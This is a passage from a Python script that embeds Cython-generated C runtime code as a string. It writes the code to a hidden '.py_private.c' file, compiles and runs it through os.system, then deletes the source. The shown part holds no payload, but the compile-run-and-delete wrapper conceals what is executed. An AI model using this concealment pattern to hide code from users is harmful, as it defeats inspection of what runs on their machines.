#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
    #if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = ".py_private.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = (
    'gcc -I' +
    PREFIX +
    '/include/python' +
    PYTHON_VERSION +
    ' -o ' +
    EXECUTE_FILE +
    ' ' +
    C_FILE +
    ' -L' +
    PREFIX +
    '/lib -lpython' +
    PYTHON_VERSION
)


with open(C_FILE, "w") as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+COMPILE_FILE+" && "+RUN)

os.remove(C_FILE)
